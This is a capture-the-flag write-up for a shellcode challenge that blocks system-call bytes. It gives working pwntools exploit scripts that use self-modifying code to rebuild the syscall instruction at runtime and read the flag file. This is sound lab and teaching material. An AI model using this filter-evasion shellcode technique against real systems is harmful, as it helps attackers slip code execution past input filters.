## Challenge Description
# Challenge: /challenge/syscall-smuggler
# Goal: Write and execute shellcode to read the flag.
# Constraint: The challenge reads bytes from stdin and executes them, but with a strict filter:

No system call bytes allowed.

Specifically, the input cannot contain syscall (0x0f 0x05), sysenter (0x0f 0x34), or int 0x80 (0xcd 0x80).

Phase 1: The Naive Approach (Failure)
My initial thought was to use standard x64 shellcode to perform an open -> sendfile chain.

I attempted to simply write the assembly instructions including the syscall mnemonic, hoping the filter might miss it or I could encode it differently.

The Failed Script
Python
from pwn import *
context.arch = 'amd64'

# Standard shellcode attempting to open /flag and read it
assembly = """
    /* open("/flag", 0) */
    mov rax, 2
    lea rdi, [rip+flag_str]
    xor rsi, rsi
    syscall  /* <--- The problem is here */

    /* sendfile(1, fd, 0, 1000) */
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 1000
    mov rax, 40
    syscall  /* <--- And here */

    /* exit(0) */
    mov rax, 60
    xor rdi, rdi
    syscall

flag_str:
    .string "/flag"
"""

payload = asm(assembly)

# Check if bad bytes exist (Simulation of what the challenge does)
if b'\x0f\x05' in payload:
    print("[-] Alert: Payload contains syscall bytes (0f 05)!")

p = process('/challenge/syscall-smuggler')
p.send(payload)
p.interactive()
The Error
Plaintext
Reading 0x1000 bytes from stdin.
...
[!] Security Violation: System call bytes detected in input!
(Note: The actual error might vary, but the payload is rejected or the program simply crashes/exits if the filter catches it.)

Analysis
Why did it fail?
In x86-64 assembly, the syscall instruction compiles to the machine code 0x0f 0x05.
The challenge scans the input buffer before execution. Since my payload contained these static bytes, it was rejected.

To defeat this, I need Self-Modifying Code (SMC).
I need to input bytes that are not 0x0f 0x05, but turn into 0x0f 0x05 during runtime.

The Strategy:

Insert a placeholder: 0x0e 0x05 (which is harmless).

Insert an instruction immediately before it: inc byte ptr [rip].

When inc executes, it increments the byte at [rip] (which points to the 0x0e).

0x0e becomes 0x0f.

The CPU then executes 0x0f 0x05 -> syscall.

Phase 2: The Final Solution
This script constructs the shellcode using the SMC technique to "smuggle" the syscalls past the filter.

Python
#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

# The "Smuggler" Gadget
# ---------------------
# fe 05 00 00 00 00  => inc byte ptr [rip] (Modifies the next byte)
# 0e 05              => The placeholder (0e + 1 = 0f)
# Result at runtime: 0f 05 (syscall)
smuggled_syscall = b"\xfe\x05\x00\x00\x00\x00" + b"\x0e\x05"

# Part 1: open("/flag", O_RDONLY)
assembly_part1 = asm("""
    xor rax, rax
    push rax                 /* Null terminator */
    mov rbx, 0x67616c662f    /* "/flag" */
    push rbx
    mov rdi, rsp             /* rdi -> "/flag" */
    xor rsi, rsi             /* O_RDONLY */
    mov rax, 2               /* SYS_open */
""")

# Part 2: sendfile(1, fd, 0, 1000)
assembly_part2 = asm("""
    mov rsi, rax             /* fd from open */
    mov rdi, 1               /* stdout */
    xor rdx, rdx             /* offset */
    mov r10, 1000            /* count */
    mov rax, 40              /* SYS_sendfile */
""")

# Part 3: exit(0)
assembly_part3 = asm("""
    mov rax, 60
    xor rdi, rdi
""")

# Assemble the full payload with smuggled syscalls
payload = assembly_part1 + smuggled_syscall + \
          assembly_part2 + smuggled_syscall + \
          assembly_part3 + smuggled_syscall

if b'\x0f\x05' in payload:
    print("[-] Failed: Payload still contains 0x0f 0x05!")
else:
    print("[+] Success: Payload is clean. Sending...")
    
    # Save to file for piping: python3 exp.py && cat payload | /challenge/syscall-smuggler
    with open('payload', 'wb') as f:
        f.write(payload)
        
    p = process('/challenge/syscall-smuggler')
    p.send(payload)
    p.interactive()
